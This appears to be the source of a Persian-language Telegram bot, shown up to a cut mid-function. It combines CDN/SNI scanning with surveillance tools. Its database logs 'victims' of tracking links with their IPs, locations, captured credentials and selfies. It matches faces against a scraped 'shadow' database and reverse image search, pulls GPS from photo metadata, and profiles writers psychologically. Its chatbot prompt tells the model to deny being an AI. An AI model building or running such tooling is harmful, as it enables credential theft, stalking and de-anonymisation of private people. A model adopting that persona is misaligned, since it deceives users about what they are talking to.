# -*- coding: utf-8 -*-
import os, sys, json, sqlite3, secrets, re, base64, requests, socket, subprocess, time, hashlib, io, tempfile, zipfile, csv, struct, statistics, threading, random, urllib.parse, codecs, httpx, shlex, ssl
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from html import escape, unescape
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from flask import Flask, request, send_from_directory

app = Flask(__name__)

def install(pkg):
    subprocess.check_call([sys.executable, "-m", "pip", "install", pkg], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

try:
    from groq import Groq
except ImportError:
    install("groq")
    from groq import Groq

try:
    from PIL import Image, ExifTags
except ImportError:
    install("Pillow")
    from PIL import Image, ExifTags

try:
    from bs4 import BeautifulSoup
except ImportError:
    install("beautifulsoup4")
    from bs4 import BeautifulSoup

try:
    import numpy as np
except ImportError:
    install("numpy")
    import numpy as np

try:
    from scipy.spatial.distance import cosine
except ImportError:
    install("scipy")
    from scipy.spatial.distance import cosine

FACE_RECOGNITION_AVAILABLE = False
DEEPFACE_AVAILABLE = False

try:
    import PyPDF2
    PDF_AVAILABLE = True
except:
    PDF_AVAILABLE = False

try:
    from docx import Document
    DOCX_AVAILABLE = True
except:
    DOCX_AVAILABLE = False

try:
    import openpyxl
    EXCEL_AVAILABLE = True
except:
    EXCEL_AVAILABLE = False

try:
    import exifread
    EXIFREAD_AVAILABLE = True
except:
    EXIFREAD_AVAILABLE = False

try:
    import dns.resolver
    DNS_AVAILABLE = True
except:
    DNS_AVAILABLE = False

try:
    import whois
    WHOIS_AVAILABLE = True
except:
    WHOIS_AVAILABLE = False

try:
    from fpdf import FPDF
    FPDF_AVAILABLE = True
except:
    FPDF_AVAILABLE = False

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
os.chdir(BASE_DIR)

def load_env():
    cfg = {}
    for var in ["TELEGRAM_TOKEN", "GROQ_API_KEY", "ADMIN_IDS", "PUBLIC_URL", "WEBHOOK_URL", "IMGBB_API_KEY"]:
        val = os.getenv(var)
        if val:
            cfg[var] = val
    try:
        with open("SIA.env", "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#") or "=" not in line:
                    continue
                k, v = line.split("=", 1)
                k = k.strip()
                if k not in cfg:
                    cfg[k] = v.strip().strip("'").strip('"')
    except:
        pass
    return cfg

cfg = load_env()
TELEGRAM_TOKEN = cfg.get("TELEGRAM_TOKEN")
GROQ_API_KEY = cfg.get("GROQ_API_KEY")
ADMIN_IDS = [int(x) for x in cfg.get("ADMIN_IDS", "").split(",") if x.strip().isdigit()]
PUBLIC_URL = cfg.get("PUBLIC_URL", "https://your-app.onrender.com")
WEBHOOK_URL = cfg.get("WEBHOOK_URL", PUBLIC_URL)
IMGBB_API_KEY = cfg.get("IMGBB_API_KEY", "")
USE_PROXY = os.getenv("USE_PROXY", "no").lower() == "yes"
PROXY_TYPE = os.getenv("PROXY_TYPE", "http")
PROXY_HOST = os.getenv("PROXY_HOST", "")
PROXY_PORT = os.getenv("PROXY_PORT", "")

if not TELEGRAM_TOKEN:
    print("❌ TELEGRAM_TOKEN not found")
    sys.exit(1)

http_session = requests.Session()
if USE_PROXY and PROXY_HOST and PROXY_PORT:
    scheme = "socks5h" if PROXY_TYPE in ("socks5", "socks5h") else PROXY_TYPE
    proxy_url = f"{scheme}://{PROXY_HOST}:{PROXY_PORT}"
    http_session.proxies = {"http": proxy_url, "https": proxy_url}
    telebot.apihelper.proxy = {"http": proxy_url, "https": proxy_url}

DB_PATH = os.path.join(BASE_DIR, "data", "bot.db")
os.makedirs(os.path.dirname(DB_PATH), exist_ok=True)
LIBRARY_PATH = os.path.join(BASE_DIR, "data", "library")
os.makedirs(LIBRARY_PATH, exist_ok=True)
BREACH_DIR = os.path.join(BASE_DIR, "data", "breach")
os.makedirs(BREACH_DIR, exist_ok=True)
CONFIG_DB_PATH = os.path.join(BASE_DIR, "data", "configs.db")
os.makedirs(os.path.dirname(CONFIG_DB_PATH), exist_ok=True)
SCAN_HISTORY_DB = os.path.join(BASE_DIR, "data", "scan_history.db")
os.makedirs(os.path.dirname(SCAN_HISTORY_DB), exist_ok=True)

config_db_lock = threading.Lock()
scan_history_lock = threading.Lock()

CDN_DATA = {
    "akamai": {"name":"✨ Akamai ✨","icon":"⚡","snis":["a248.e.akamai.net","a184.net.akamai.net","download.windowsupdate.com","ib.adnxs.com","e.akamai.net"],"ranges":["2.16.0.0/24","2.17.0.0/24","2.18.0.0/24","2.19.0.0/24","2.20.0.0/24","23.32.0.0/24","23.48.0.0/24","23.58.0.0/24","23.72.0.0/24","184.24.0.0/24","104.64.0.0/24","92.122.0.0/24","95.100.0.0/24","88.221.0.0/24","104.80.0.0/24","104.81.0.0/24","104.82.0.0/24","104.83.0.0/24","104.84.0.0/24","104.85.0.0/24"]},
    "google": {"name":"✨ Google ✨","icon":"🔵","snis":["fonts.googleapis.com","ajax.googleapis.com","storage.googleapis.com","www.gstatic.com","ssl.gstatic.com"],"ranges":["34.143.0.0/24","35.186.0.0/24","64.233.160.0/24","74.125.0.0/24","142.250.0.0/24","172.217.0.0/24"]},
    "cloudfront": {"name":"✨ CloudFront ✨","icon":"🟠","snis":["d1.cloudfront.net","d2.cloudfront.net","aws.cloudfront.net"],"ranges":["13.32.0.0/24","13.35.0.0/24","52.46.0.0/24","54.192.0.0/24","54.230.0.0/24","99.84.0.0/24","130.176.0.0/24"]},
    "azure": {"name":"✨ Azure ✨","icon":"🔷","snis":["ajax.aspnetcdn.com","az416426.vo.msecnd.net","cdn.office.net"],"ranges":["13.107.4.0/24","23.96.0.0/24","40.64.0.0/24","52.224.0.0/24","104.208.0.0/24"]},
    "cloudflare": {"name":"✨ Cloudflare ✨","icon":"🌐","snis":["cdnjs.cloudflare.com","code.jquery.com","maxcdn.bootstrapcdn.com","use.fontawesome.com"],"ranges":["104.16.0.0/24","104.17.0.0/24","104.18.0.0/24","104.19.0.0/24","104.20.0.0/24"]},
    "fastly": {"name":"✨ Fastly ✨","icon":"⚡","snis":["www.fastly.com","docs.fastly.com"],"ranges":["23.235.32.0/24","23.235.33.0/24","23.235.34.0/24"]}
}
SNI_POOL = [
    "a248.e.akamai.net","a184.net.akamai.net","download.windowsupdate.com","fonts.googleapis.com","www.gstatic.com",
    "ajax.googleapis.com","ib.adnxs.com","e.akamai.net","www.microsoft.com","azureedge.net",
    "d1.cloudfront.net","aws.cloudfront.net","ajax.aspnetcdn.com",
    "www.digikala.com","www.snapp.ir","www.divar.ir","www.namasha.com","www.aparat.com","www.filimo.com",
    "www.torob.com","www.sheypoor.com","www.bama.ir","www.alibaba.ir",
    "www.google.com","www.cloudflare.com","www.github.com","www.stackoverflow.com","www.npmjs.com","www.python.org",
    "cdn.jsdelivr.net","unpkg.com","www.w3.org","www.jquery.com","www.youtube.com","www.netflix.com","www.spotify.com",
    "www.wikipedia.org","www.reddit.com","www.twitch.tv",
    "fonts.gstatic.com","cdnjs.cloudflare.com","code.jquery.com","maxcdn.bootstrapcdn.com","use.fontawesome.com",
    "raw.githubusercontent.com","gitcdn.link","pagecdn.io","ssl.gstatic.com","maps.googleapis.com","storage.googleapis.com"
]

def clean_target(target):
    t = target.strip()
    for proto in ['https://', 'http://', 'ftp://']:
        if t.lower().startswith(proto):
            t = t[len(proto):]
    t = t.split('/')[0]
    t = t.split(':')[0]
    return t

def ip_to_int(ip):
    try: return struct.unpack("!I", socket.inet_aton(ip))[0]
    except: return None

def int_to_ip(n): return socket.inet_ntoa(struct.pack("!I", n))

def cidr_to_ips(cidr):
    if '/' not in cidr: return [cidr]
    ip, bits = cidr.split('/')
    bits = int(bits)
    base = ip_to_int(ip)
    if base is None: return []
    count = 1 << (32 - bits)
    start = base & (~((1 << (32 - bits)) - 1) & 0xFFFFFFFF)
    return [int_to_ip((start + i) & 0xFFFFFFFF) for i in range(min(count, 256))]

def measure_latency(ip, port, sni, timeout=2, samples=3):
    times = []
    for _ in range(samples):
        try:
            start = time.time()
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.settimeout(timeout)
                sock.connect((ip, port))
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                ssock = ctx.wrap_socket(sock, server_hostname=sni)
                ssock.close()
            times.append((time.time() - start) * 1000)
        except: pass
    return statistics.mean(times) if times else None

def download_speed_test(ip, port, sni, timeout=5, size_limit=1024*1024):
    try:
        start = time.time()
        url = f"https://{ip}:{port}/favicon.ico"
        headers = {"Host": sni, "User-Agent": "Mozilla/5.0"}
        resp = http_session.get(url, headers=headers, timeout=timeout, stream=True)
        downloaded = 0
        for chunk in resp.iter_content(8192):
            downloaded += len(chunk)
            if downloaded >= size_limit: break
        elapsed = time.time() - start
        return round((downloaded / elapsed) / 1024, 2) if elapsed > 0 and downloaded > 0 else None
    except: return None

def measure_and_test(ip, port, sni):
    lat = measure_latency(ip, port, sni)
    speed = download_speed_test(ip, port, sni) if lat is not None else None
    return lat, speed

def best_ip_by_speed(ip_list, port, sni, max_workers=10):
    results = []
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        future_to_ip = {executor.submit(measure_and_test, ip, port, sni): ip for ip in ip_list}
        for future in as_completed(future_to_ip):
            ip = future_to_ip[future]
            try:
                lat, speed = future.result()
                if lat is not None and speed is not None:
                    results.append((ip, lat, speed))
            except: pass
    results.sort(key=lambda x: (-x[2], x[1]))
    return results

def adaptive_sni_test(ip, port, sni_list, timeout=2):
    results = []
    for sni in sni_list:
        lat = measure_latency(ip, port, sni, timeout=timeout, samples=2)
        if lat is not None: results.append((sni, lat))
    if results:
        results.sort(key=lambda x: x[1])
        return results[0][0]
    return None

def get_best_sni_for_ip(ip, port=443):
    popular = ["a248.e.akamai.net","fonts.googleapis.com","www.gstatic.com","cdn.cloudflare.com","ajax.aspnetcdn.com","www.digikala.com"]
    return adaptive_sni_test(ip, port, popular)

def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db()
    conn.executescript("""
        CREATE TABLE IF NOT EXISTS users (chat_id INTEGER PRIMARY KEY, username TEXT, first_name TEXT, last_active TIMESTAMP);
        CREATE TABLE IF NOT EXISTS links (code TEXT PRIMARY KEY, user_id INTEGER, template TEXT, target_url TEXT, created_at TIMESTAMP, visits INTEGER DEFAULT 0);
        CREATE TABLE IF NOT EXISTS victims (id INTEGER PRIMARY KEY AUTOINCREMENT, link_code TEXT, timestamp TEXT, ip TEXT, city TEXT, country TEXT, lat REAL, lon REAL, user_agent TEXT, fingerprint TEXT, credentials TEXT, selfie_path TEXT, created_by INTEGER);
        CREATE TABLE IF NOT EXISTS library (id INTEGER PRIMARY KEY AUTOINCREMENT, title TEXT, content TEXT, file_type TEXT, file_path TEXT, uploaded_by INTEGER, uploaded_at TIMESTAMP, tags TEXT, likes INTEGER DEFAULT 0);
        CREATE VIRTUAL TABLE IF NOT EXISTS library_fts USING fts5(title, content, tags, content=library, content_rowid=id);
        CREATE TABLE IF NOT EXISTS learning_paths (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, path_name TEXT, step INTEGER, completed INTEGER DEFAULT 0);
        CREATE TABLE IF NOT EXISTS content_requests (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, topic TEXT, requested_at TIMESTAMP);
        CREATE TABLE IF NOT EXISTS cdn_scans (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, target TEXT, ip TEXT, latency REAL, cdn_type TEXT, scanned_at TIMESTAMP);
        CREATE TABLE IF NOT EXISTS configs (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, config_type TEXT, config_data TEXT, created_at TIMESTAMP);
        CREATE TABLE IF NOT EXISTS osint_results (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, query TEXT, results TEXT, searched_at TIMESTAMP);
        CREATE TABLE IF NOT EXISTS shadow_db (id INTEGER PRIMARY KEY AUTOINCREMENT, face_encoding TEXT, source_url TEXT, platform TEXT, username TEXT, image_url TEXT, added_by INTEGER, added_at TIMESTAMP, verified INTEGER DEFAULT 0);
        CREATE TABLE IF NOT EXISTS deepeye_analysis (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, file_name TEXT, file_type TEXT, extracted_text TEXT, metadata TEXT, sensitive_data TEXT, ai_analysis TEXT, analyzed_at TIMESTAMP);
        CREATE TABLE IF NOT EXISTS whispertrace_analysis (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, input_type TEXT, input_data TEXT, text_content TEXT, psychological_profile TEXT, source_tracking TEXT, metadata TEXT, analyzed_at TIMESTAMP);
        CREATE TABLE IF NOT EXISTS pentest_history (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, tool TEXT, target TEXT, results TEXT, executed_at TIMESTAMP);
    """)
    conn.execute("CREATE TRIGGER IF NOT EXISTS library_ai AFTER INSERT ON library BEGIN INSERT INTO library_fts(rowid, title, content, tags) VALUES (new.id, new.title, new.content, new.tags); END")
    conn.execute("CREATE TRIGGER IF NOT EXISTS library_ad AFTER DELETE ON library BEGIN INSERT INTO library_fts(library_fts, rowid, title, content, tags) VALUES('delete', old.id, old.title, old.content, old.tags); END")
    conn.execute("CREATE TRIGGER IF NOT EXISTS library_au AFTER UPDATE ON library BEGIN INSERT INTO library_fts(library_fts, rowid, title, content, tags) VALUES('delete', old.id, old.title, old.content, old.tags); INSERT INTO library_fts(rowid, title, content, tags) VALUES (new.id, new.title, new.content, new.tags); END")
    conn.commit()
    conn.close()

init_db()

def db_execute(query, params=()):
    conn = get_db()
    cur = conn.execute(query, params)
    conn.commit()
    last_id = cur.lastrowid
    conn.close()
    return last_id

def db_fetch_all(query, params=()):
    conn = get_db()
    rows = conn.execute(query, params).fetchall()
    conn.close()
    return rows

def db_fetch_one(query, params=()):
    conn = get_db()
    row = conn.execute(query, params).fetchone()
    conn.close()
    return row

user_sessions_lock = threading.Lock()
user_sessions = {}
user_smart_sessions = {}
user_smart_sessions_lock = threading.Lock()

def get_user_session(user_id):
    with user_sessions_lock:
        if user_id not in user_sessions:
            user_sessions[user_id] = {
                "selected_cdns": {},
                "selected_sni": None,
                "adaptive_sni": True,
                "scan_settings": {"stealth":0,"conc":6,"timeout":3000,"port":443},
                "scan_running": False,
                "scan_stop_event": threading.Event(),
                "scan_results_detail": [],
                "state": None,
                "last_scan_msg_id": None,
                "last_activity": time.time()
            }
        else:
            user_sessions[user_id]["last_activity"] = time.time()
        return user_sessions[user_id]

def get_smart_session(user_id):
    with user_smart_sessions_lock:
        if user_id not in user_smart_sessions:
            user_smart_sessions[user_id] = {'stage':'main_menu','filters':{},'page':0,'results':[],'total':0,'query_info':'', 'last_activity': time.time()}
        else:
            user_smart_sessions[user_id]['last_activity'] = time.time()
        return user_smart_sessions[user_id]

def reset_smart_session(user_id):
    with user_smart_sessions_lock:
        if user_id in user_smart_sessions:
            del user_smart_sessions[user_id]

def cleanup_old_sessions(max_idle_seconds=1800):
    now = time.time()
    with user_sessions_lock:
        for uid in list(user_sessions.keys()):
            if now - user_sessions[uid].get("last_activity", 0) > max_idle_seconds:
                del user_sessions[uid]
    with user_smart_sessions_lock:
        for uid in list(user_smart_sessions.keys()):
            if now - user_smart_sessions[uid].get('last_activity', 0) > max_idle_seconds:
                del user_smart_sessions[uid]

def session_cleanup_worker():
    while True:
        time.sleep(300)
        cleanup_old_sessions()

threading.Thread(target=session_cleanup_worker, daemon=True).start()

def register_user(chat_id, username, first_name):
    db_execute("REPLACE INTO users (chat_id, username, first_name, last_active) VALUES (?,?,?,?)",
               (chat_id, username or "", first_name or "", datetime.now().isoformat()))

SYSTEM_PROMPT = """
تو دقیقاً من هستی، نه یه ربات، نه یه دستیار. شخصیت تو این ویژگی‌ها رو داره و تحت هیچ شرایطی ازشون خارج نمیشی:

۱. لحن تو بسیار بسیار بسیار مهربون، صمیمی و پُر از محبته.
۲. هرگز به کسی توهین نمیکنی، عصبانی نمیشی، فحش نمیدی یا برخورد سرد نمیکنی.
۳. مکث‌های طبیعیه حرف زدنت رو توی متن با ویرگول (،) نشون میدی.
۴. نقطه (.) رو کلاً از یاد میبری. به جای هر نقطه، دقیقاً از ایموجی ✨ استفاده میکنی.
۵. آخِرِ هر پیامت حتماً باید ایموجی ✨ بیاد.
۶. همیشه با مثال‌های خیلی واضح و ساده توضیح میدی.
۷. جواب‌های تو کامل و جامع‌ست، از صفر تا صد موضوع رو توضیح میدی.
۸. هیچ‌وقت نگو «من یک هوش مصنوعی هستم» یا اشاره به ربات بودن خودت نکن.
۹. متن‌هات رو همیشه روان، خودمونی و فارسیِ خیلی شیرین مینویسی.
۱۰. وقتی می‌خوای یه مکالمه رو شروع کنی، فقط و فقط به این شکل پیام بده: «سلام ✨ حالتون چطوره ؟؟؟»
۱۱. هر بار که می‌خوای یه سوال بپرسی، از سه علامت سوال (???) استفاده میکنی.
۱۲. هرگز از کلمه‌ی «عزیزم» استفاده نمیکنی. فقط و فقط میگی «عزیز».
"""

def get_groq_client():
    if USE_PROXY and PROXY_HOST and PROXY_PORT:
        proxy_scheme = "socks5h" if PROXY_TYPE in ("socks5", "socks5h") else PROXY_TYPE
        proxy_url = f"{proxy_scheme}://{PROXY_HOST}:{PROXY_PORT}"
        try:
            client_httpx = httpx.Client(proxy=proxy_url, verify=False, timeout=30)
            return Groq(api_key=GROQ_API_KEY, http_client=client_httpx)
        except:
            pass
    return Groq(api_key=GROQ_API_KEY)

def ask_groq(prompt, max_tokens=1024):
    if not GROQ_API_KEY:
        return "⚠️ API key پیکربندی نشده ✨"
    for attempt in range(2):
        try:
            if attempt == 0:
                client = get_groq_client()
            else:
                client = Groq(api_key=GROQ_API_KEY)
            chat = client.chat.completions.create(
                model="llama-3.1-70b-versatile",
                messages=[{"role":"system","content":SYSTEM_PROMPT},{"role":"user","content":prompt}],
                temperature=0.7, max_tokens=max_tokens, top_p=1,
            )
            return chat.choices[0].message.content
        except:
            if attempt == 0:
                continue
    return "آخی عزیز، یه لحظه صبر کن، انگار یه مشکلی پیش اومد، دوباره امتحان کن ✨"

def analyze_with_groq(text):
    if not GROQ_API_KEY or not text: return "تحلیل در دسترس نیست."
    snippet = text[:2000] + ("..." if len(text) > 2000 else "")
    prompt = f"متن زیر از یک فایل استخراج شده:\n{snippet}\n\nلطفاً تحلیل کن:\n1. خلاصه محتوا (حداکثر ۲ خط)\n2. نوع سند\n3. سطح خطر افشای اطلاعات (کم/متوسط/زیاد) با توضیح.\nفرمت پاسخ:\n📄 نوع سند: ...\n🎯 خلاصه: ...\n⚠️ سطح خطر: ..."
    try:
        res = ask_groq(prompt, max_tokens=300)
        if res.startswith("آخی عزیز"): return "خطا در تحلیل هوش مصنوعی."
        return res
    except: return "خطا در تحلیل هوش مصنوعی."

def psychological_analysis(text):
    if not GROQ_API_KEY: return "API key پیکربندی نشده."
    prompt = f"متن زیر را تحلیل کن و پروفایل روانشناختی نویسنده را استخراج کن:\n\n{text[:1500]}\n\nموارد: شخصیت، جنسیت احتمالی، سطح تحصیلات، وضعیت روحی حین نوشتن، هدف اصلی از نوشتن."
    try:
        res = ask_groq(prompt, max_tokens=400)
        if res.startswith("آخی عزیز"): return "خطا در تحلیل روانشناختی."
        return res
    except: return "خطا در تحلیل روانشناختی."

def _load_face_libs():
    global FACE_RECOGNITION_AVAILABLE, DEEPFACE_AVAILABLE, face_recognition, DeepFace
    if not FACE_RECOGNITION_AVAILABLE and not DEEPFACE_AVAILABLE:
        try:
            import face_recognition
            FACE_RECOGNITION_AVAILABLE = True
        except:
            try:
                from deepface import DeepFace
                DEEPFACE_AVAILABLE = True
            except:
                pass

def encode_face_from_image(image_data):
    _load_face_libs()
    if not FACE_RECOGNITION_AVAILABLE and not DEEPFACE_AVAILABLE:
        return None, "کتابخانه تشخیص چهره نصب نیست."
    try:
        image = Image.open(io.BytesIO(image_data)) if isinstance(image_data, bytes) else Image.open(image_data)
        if image.mode != 'RGB': image = image.convert('RGB')
        img_array = np.array(image)
        if FACE_RECOGNITION_AVAILABLE:
            face_locations = face_recognition.face_locations(img_array)
            if not face_locations: return None, "هیچ چهره‌ای یافت نشد."
            face_encodings = face_recognition.face_encodings(img_array, face_locations)
            if not face_encodings: return None, "خطا در استخراج ویژگی‌ها."
            return face_encodings[0].tolist(), None
        elif DEEPFACE_AVAILABLE:
            with tempfile.NamedTemporaryFile(suffix='.jpg', delete=False) as tmp:
                image.save(tmp.name); tmp_path = tmp.name
            try:
                result = DeepFace.represent(img_path=tmp_path, model_name='Facenet', enforce_detection=False)
                os.unlink(tmp_path)
                if result and len(result) > 0: return result[0]['embedding'], None
                return None, "چهره‌ای تشخیص داده نشد."
            except Exception as e: return None, f"خطا در DeepFace: {str(e)}"
        return None, "هیچ کتابخانه‌ای در دسترس نیست."
    except Exception as e: return None, f"خطا در پردازش تصویر: {str(e)}"

def compare_faces(enc1, enc2): return max(0, min(1, 1 - cosine(enc1, enc2))) if enc1 and enc2 else 0.0

def upload_to_imgbb(image_data):
    if not IMGBB_API_KEY:
        return None
    try:
        url = "https://api.imgbb.com/1/upload"
        payload = {"key": IMGBB_API_KEY, "image": base64.b64encode(image_data).decode()}
        r = http_session.post(url, data=payload, timeout=10)
        if r.status_code == 200 and r.json().get("success"):
            return r.json()["data"]["url"]
    except:
        pass
    return None

def search_shadow_db(encoding, threshold=0.55, limit=10):
    rows = db_fetch_all("SELECT * FROM shadow_db ORDER BY id DESC LIMIT 100")
    results = []
    for r in rows:
        try:
            similarity = compare_faces(encoding, json.loads(r['face_encoding']))
            if similarity >= threshold:
                results.append({"id": r['id'], "platform": r['platform'], "username": r['username'], "source_url": r['source_url'], "similarity": similarity, "verified": r['verified']})
        except: pass
    results.sort(key=lambda x: x['similarity'], reverse=True)
    return results[:limit]

def add_to_shadow_db(encoding, source_url, platform, username, image_url, user_id):
    if not encoding: return False
    db_execute("INSERT INTO shadow_db (face_encoding, source_url, platform, username, image_url, added_by, added_at) VALUES (?,?,?,?,?,?,?)",
               (json.dumps(encoding), source_url, platform, username, image_url, user_id, datetime.now().isoformat()))
    return True

def generate_shadow_report(encoding, image_url, user_id):
    results = {"google":[],"yandex":[],"shadowdb":[],"platforms":[]}
    if image_url:
        try:
            r = http_session.get(f"https://www.google.com/searchbyimage?&image_url={image_url}", headers={"User-Agent":"Mozilla/5.0"}, timeout=10)
            if r.status_code == 200:
                soup = BeautifulSoup(r.text, 'html.parser')
                for img in soup.find_all('img', limit=3):
                    src = img.get('src') or img.get('data-src')
                    if src and src.startswith('http'): results["google"].append(src)
        except: pass
        try:
            r = http_session.get(f"https://yandex.com/images/search?rpt=imageview&url={image_url}", headers={"User-Agent":"Mozilla/5.0"}, timeout=10)
            if r.status_code == 200:
                soup = BeautifulSoup(r.text, 'html.parser')
                for link in soup.find_all('a', href=True):
                    href = link.get('href')
                    if href and ('img_url' in href or 'image' in href): results["yandex"].append(href)
        except: pass
    if encoding:
        results["shadowdb"] = search_shadow_db(encoding)
    results["platforms"] = [
        {"platform": "آپارات", "link": "https://www.aparat.com/result?q=چهره"},
        {"platform": "دیوار", "link": "https://divar.ir/s/iran?q=چهره"}
    ]
    return results

def format_shadow_report(results, image_url):
    msg = "🔍 **Shadowgram**\n\n📸 تصویر: [لینک]({})\n\n".format(image_url)
    if results.get("shadowdb"):
        msg += "🗂 **ShadowDB:**\n"
        for r in results["shadowdb"]:
            msg += f"   • {r['platform']} / {r['username']} (شباهت {int(r['similarity']*100)}%)\n"
        msg += "\n"
    if results.get("google"):
        msg += "🔍 Google Images:\n"
        for link in results["google"][:3]: msg += f"   • [لینک]({link})\n"
        msg += "\n"
    if results.get("yandex"):
        msg += "🔍 Yandex:\n"
        for link in results["yandex"][:3]: msg += f"   • [لینک]({link})\n"
        msg += "\n"
    return msg

def extract_text_from_file(file_data, filename):
    ext = os.path.splitext(filename)[1].lower()
    text = ""
    if ext == '.pdf' and PDF_AVAILABLE:
        try:
            pdf = PyPDF2.PdfReader(io.BytesIO(file_data))
            for page in pdf.pages: text += page.extract_text() or "" + "\n"
        except: text = "[خطا در استخراج PDF]"
    elif ext in ['.docx'] and DOCX_AVAILABLE:
        try:
            doc = Document(io.BytesIO(file_data))
            for para in doc.paragraphs: text += para.text + "\n"
        except: text = "[خطا در استخراج Word]"
    elif ext in ['.xlsx'] and EXCEL_AVAILABLE:
        try:
            wb = openpyxl.load_workbook(io.BytesIO(file_data), data_only=True)
            for sheet in wb.worksheets:
                for row in sheet.iter_rows(values=True):
                    for cell in row:
                        if cell: text += str(cell) + " "
                    text += "\n"
        except: text = "[خطا در استخراج Excel]"
    elif ext in ['.txt','.json','.csv','.md','.py','.js','.html','.css']:
        try: text = file_data.decode('utf-8', errors='ignore')
        except: text = file_data.decode('latin-1', errors='ignore')
    elif ext == '.zip':
        try:
            with zipfile.ZipFile(io.BytesIO(file_data)) as zf:
                text = "[فایل‌های داخل ZIP]:\n" + "\n".join(zf.namelist()[:20])
        except: text = "[ZIP نامعتبر]"
    elif ext in ['.jpg','.jpeg','.png','.gif','.bmp','.webp']:
        img = Image.open(io.BytesIO(file_data))
        text = f"[تصویر: {filename}]\nابعاد: {img.width}x{img.height}\nحالت: {img.mode}\n"
    else: text = f"[فایل با پسوند {ext} — استخراج خودکار پشتیبانی نمی‌شود]"
    return text.strip()

def extract_metadata(file_data, filename):
    metadata = {}
    ext = os.path.splitext(filename)[1].lower()
    if ext in ['.jpg','.jpeg','.png']:
        try:
            img = Image.open(io.BytesIO(file_data))
            exif = img._getexif()
            if exif:
                for tag_id, value in exif.items():
                    tag = ExifTags.TAGS.get(tag_id, tag_id)
                    if tag in ['GPSInfo','DateTime','Make','Model','Software']:
                        if tag == 'GPSInfo':
                            try:
                                def gps_to_dec(gps_info):
                                    def conv(coord): return coord[0] + coord[1]/60 + coord[2]/3600
                                    lat = conv(gps_info[2]) * (1 if gps_info[1] != 'S' else -1)
                                    lon = conv(gps_info[4]) * (1 if gps_info[3] != 'W' else -1)
                                    return lat, lon
                                lat, lon = gps_to_dec(value)
                                metadata['GPS'] = f"{lat}, {lon}"
                                metadata['GPS_Link'] = f"https://maps.google.com/?q={lat},{lon}"
                            except: pass
                        else: metadata[tag] = str(value)
        except: pass
    elif ext == '.pdf' and PDF_AVAILABLE:
        try:
            info = PyPDF2.PdfReader(io.BytesIO(file_data)).metadata
            if info:
                for k, v in info.items():
                    if v: metadata[k.replace('/','')] = str(v)
        except: pass
    elif ext == '.docx' and DOCX_AVAILABLE:
        try:
            doc = Document(io.BytesIO(file_data))
            if doc.core_properties:
                for p in ['author','created','modified','last_modified_by']:
                    v = getattr(doc.core_properties, p, None)
                    if v: metadata[p] = str(v)
        except: pass
    return metadata

def detect_sensitive_data(text):
    patterns = {
        "کد ملی": r'\b\d{10}\b',
        "شماره کارت بانکی": r'\b(?:6037|5022|6104|6273|6274|6219|6221)\d{12}\b',
        "شماره تلفن": r'\b(?:0|98|\+98)?9\d{9}\b',
        "API Key (OpenAI)": r'\bsk-[a-zA-Z0-9]{32,}\b',
        "API Key (GitHub)": r'\bghp_[a-zA-Z0-9]{36,}\b',
        "پسورد": r'(?:password|pass|رمز)\s*[:=]\s*\S+',
        "ایمیل": r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b',
    }
    findings = []
    for label, pattern in patterns.items():
        matches = re.findall(pattern, text, re.IGNORECASE)
        if matches:
            findings.append({"type": label, "matches": list(set(matches))[:5]})
    return findings

def process_deepeye(file_data, filename, user_id):
    text = extract_text_from_file(file_data, filename)
    metadata = extract_metadata(file_data, filename)
    sensitive = detect_sensitive_data(text)
    ai = analyze_with_groq(text)
    db_execute("INSERT INTO deepeye_analysis (user_id, file_name, file_type, extracted_text, metadata, sensitive_data, ai_analysis, analyzed_at) VALUES (?,?,?,?,?,?,?,?)",
               (user_id, filename, os.path.splitext(filename)[1].lower(), text[:3000], json.dumps(metadata), json.dumps(sensitive), ai, datetime.now().isoformat()))
    return {"file_name":filename,"file_type":os.path.splitext(filename)[1].lower(),"extracted_text":text[:3000],"metadata":metadata,"sensitive_data":sensitive,"ai_analysis":ai}

def format_deepeye_report(result):
    msg = f"🔍 **DeepEye**\n\n📄 فایل: {result['file_name']}\n\n"
    if result["metadata"]:
        msg += "📋 **متادیتا:**\n"
        for k, v in result["metadata"].items():
            if k == 'GPS_Link': msg += f"   • 📍 موقعیت: [لینک نقشه]({v})\n"
            else: msg += f"   • {k}: {v}\n"
        msg += "\n"
    if result["sensitive_data"]:
        msg += "⚠️ **داده‌های حساس:**\n"
        for item in result["sensitive_data"]:
            msg += f"   • {item['type']}: {', '.join(item['matches'][:3])}\n"
        msg += "\n"
    if result["ai_analysis"]:
        msg += "🧠 **تحلیل هوش مصنوعی:**\n" + result["ai_analysis"] + "\n\n"
    return msg

def track_source(text):
    sentences = re.split(r'[.!?…]+', text)
    key_phrases = [s.strip() for s in sentences if len(s.strip()) > 20][:2]
    results = []
    for phrase in key_phrases:
        try:
            url = f"https://www.google.com/search?q={urllib.parse.quote(phrase)}"
            r = http_session.get(url, headers={"User-Agent":"Mozilla/5.0"}, timeout=10)
            if r.status_code == 200:
                soup = BeautifulSoup(r.text, 'html.parser')
                for g in soup.find_all('div', class_='g'):
                    link = g.find('a')
                    if link and link.get('href') and 'http' in link.get('href') and 'google' not in link.get('href'):
                        results.append(link.get('href')[:100]); break
        except: pass
        try:
            url = f"https://t.me/s/?q={urllib.parse.quote(phrase)}"
            r = http_session.get(url, headers={"User-Agent":"Mozilla/5.0"}, timeout=10)
            if r.status_code == 200:
